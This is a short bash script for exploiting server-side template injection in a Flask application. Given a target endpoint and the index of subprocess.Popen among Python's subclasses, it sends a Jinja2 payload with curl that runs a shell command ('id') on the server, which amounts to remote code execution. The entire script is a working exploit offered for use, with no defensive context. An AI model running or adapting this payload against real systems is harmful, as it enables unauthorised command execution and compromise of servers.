#!/bin/bash
# Flask SSTI — Auto RCE with found Popen index
# Usage: mro_rce_auto.sh <ENDPOINT> <POPEN_IDX>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT> <POPEN_IDX>}"
POPEN_IDX="${2:?Usage: $0 <ENDPOINT> <POPEN_IDX>}"

# Try common Popen payload with the found index
curl -s -G \
  --data-urlencode "name={{''.__class__.__mro__[1].__subclasses__()[${POPEN_IDX}]('id',shell=True,stdout=-1).communicate()[0].decode()}}" \
  "$ENDPOINT" --max-time 10
